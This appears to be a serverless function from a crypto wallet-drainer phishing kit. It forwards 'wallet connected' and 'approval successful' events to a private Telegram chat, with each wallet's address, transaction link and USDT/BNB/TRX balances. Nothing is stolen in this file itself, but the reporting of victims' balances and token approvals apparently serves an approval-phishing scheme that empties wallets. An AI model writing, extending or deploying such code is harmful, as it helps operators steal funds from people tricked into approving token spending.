/**
 * Vercel Serverless Function - Telegram notifications
 * Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Vercel env vars
 */
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!token || !chatId) {
    return res.status(500).json({ error: 'Telegram not configured' })
  }

  try {
    const { type, address, txHash, usdtBalance, bnbBalance, trxBalance, network } = req.body || {}
    const isTrx = network === 'TRX'

    const fmt = (v) => (v == null || v === 'N/A' ? 'N/A' : Number(v).toLocaleString('en-US', { maximumFractionDigits: 4 }))
    const balanceLine = isTrx
      ? (usdtBalance != null || trxBalance != null ? `\nUSDT: \`${fmt(usdtBalance)}\`\nTRX: \`${fmt(trxBalance)}\`` : '')
      : (usdtBalance != null || bnbBalance != null ? `\nUSDT: \`${fmt(usdtBalance)}\`\nBNB: \`${fmt(bnbBalance)}\`` : '')

    const txLink = txHash
      ? (isTrx ? `https://tronscan.org/#/transaction/${txHash}` : `https://bscscan.com/tx/${txHash}`)
      : 'N/A'

    let text = ''
    if (type === 'wallet_connect') {
      text = `🔗 *Wallet Connected*${isTrx ? ' (TRX)' : ' (BNB)'}\n\nAddress: \`${address || 'N/A'}\`${balanceLine}\nTime: ${new Date().toISOString()}`
    } else if (type === 'approval_success') {
      text = `✅ *Approval Successful*${isTrx ? ' (TRC20)' : ' (BEP20)'}\n\nAddress: \`${address || 'N/A'}\`${balanceLine}\nTX: ${txHash ? `[View](${txLink})` : 'N/A'}\nTime: ${new Date().toISOString()}`
    } else {
      return res.status(400).json({ error: 'Invalid type' })
    }

    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    })

    if (!response.ok) {
      const err = await response.text()
      throw new Error(err)
    }

    return res.status(200).json({ ok: true })
  } catch (err) {
    console.error('Telegram error:', err)
    return res.status(500).json({ error: err.message })
  }
}
